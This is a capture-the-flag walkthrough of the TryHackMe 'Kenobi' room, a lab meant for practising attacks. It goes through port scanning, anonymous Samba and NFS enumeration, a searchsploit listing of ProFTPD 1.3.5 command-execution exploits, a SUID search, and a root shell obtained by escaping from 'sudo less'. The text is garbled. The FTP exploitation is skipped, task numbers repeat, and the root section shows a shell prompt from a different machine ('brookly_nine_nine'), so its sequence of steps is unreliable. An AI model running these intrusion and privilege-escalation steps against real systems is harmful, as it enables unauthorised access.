# Kenobi

<div align="left">

<figure><img src=".gitbook/assets/46f437a95b1de43238c290a9c416c8d4.png" alt="" width="128"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

### 🔗 [Kenobi](https://tryhackme.com/room/kenobi)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.51.196`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

```bash
su
echo "10.10.51.196 kenobi.thm" >> /etc/hosts

mkdir thm/kenobi.thm
cd thm/kenobi.thm

# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 kenobi.thm
```

```bash
PING kenobi.thm (10.10.51.196) 56(84) bytes of data.
64 bytes from kenobi.thm (10.10.51.196): icmp_seq=1 ttl=63 time=61.3 ms
64 bytes from kenobi.thm (10.10.51.196): icmp_seq=2 ttl=63 time=78.2 ms
64 bytes from kenobi.thm (10.10.51.196): icmp_seq=3 ttl=63 time=75.1 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.

2.1 - Scan the machine with nmap, how many ports are open?

```bash
nmap --open kenobi.thm 
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-24 12:16 EDT
Nmap scan report for kenobi.thm (10.10.51.196)
Host is up (0.062s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
```

{% hint style="info" %}
7 ports are open
{% endhint %}

#### Task 3 - Enumerating Samba for shares

![](<.gitbook/assets/image (2) (3).png>)

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

![](<.gitbook/assets/image (1) (2) (1).png>)

#### 3.1 - How many shares have been found?

```bash
nmap -p139,445 -sCV -T4 -A kenobi.thm -oG smb_scan.txt
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-24 12:25 EDT
Nmap scan report for kenobi.thm (10.10.51.196)
Host is up (0.062s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.4
OS details: Linux 5.4
Network Distance: 2 hops
Service Info: Host: KENOBI

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-06-24T16:25:19
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2023-06-24T11:25:19-05:00
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   60.44 ms 10.9.0.1
2   62.65 ms kenobi.thm (10.10.51.196)

```

After scan of SMB ports, we need to find shares using nmap script:

```bash
nmap -p139,445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.51.196
```

```bash
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.51.196\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.51.196\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.51.196\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

{% hint style="info" %}
3 shares
{% endhint %}

On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.

#### 3.2 - Once you're connected, list the files on the share. What is the file can you see?

```bash
smbclient //kenobi.thm/anonymous
```

```bash
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877092 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (46.1 KiloBytes/sec) (average 46.1 KiloBytes/sec)
smb: \> exit
cat log.txt
```

#### 3.3 - What port is FTP running on?

{% hint style="info" %}
21
{% endhint %}

#### 3.4 - What mount can we see?

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount kenobi.thm
```

{% hint style="info" %}
/var
{% endhint %}

### Task 4 - Gain initial access with ProFtpd

![](<.gitbook/assets/image (1) (2).png>)\
ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

#### 4.1 - Lets get the version of ProFtpd.

```bash
nmap -p21 -sCV kenobi.thm
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-24 12:53 EDT
Nmap scan report for kenobi.thm (10.10.51.196)
Host is up (0.063s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
Service Info: OS: Unix
```

{% hint style="info" %}
1.3.5
{% endhint %}

We can use searchsploit to find exploits for a particular software version.

Searchsploit is basically just a command line search tool for exploit-db.com.

#### 4.2 - How many exploits are there for the ProFTPd running?

```bash
// Some codeearchsploit proftpd 1.3.5            
------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                       | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                             | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                         | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                       | linux/remote/36742.txt
------------------------------------------------------------------------------------------------ ---------------------------------
```

{% hint style="info" %}
4
{% endhint %}

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

ee11cbb19052e40b07aac0ca060c23ee

</details>

#### Task 3 - Find the Root flag

Now, we need to get root permissions to explore the root folder.

We can use the following command to list SUID files or sudo -l command:

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

```bash
find: ‘/run/systemd/unit-root’: Permission denied
find: ‘/run/systemd/inaccessible’: Permission denied
find: ‘/run/lock/lvm’: Permission denied
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1

-rwsr-xr-x 1 root root 43088 Jan  8  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 170760 Dec  1  2017 /bin/less
-rwsr-xr-x 1 root root 26696 Jan  8  2020 /bin/umount
```

/bin/less stands out, We can use script of this website to became a root, in this case we choose less process: [https://gtfobins.github.io/gtfobins/less/](https://gtfobins.github.io/gtfobins/less/)

```bash
sudo less /etc/profile
!/bin/sh
```

```bash
jake@brookly_nine_nine:/$ sudo less /etc/profile
# whoami
root
```

Now, we're root!

```bash
# ls
bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt
```

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

63a9f0ea7bb98050796b649e85481845

</details>
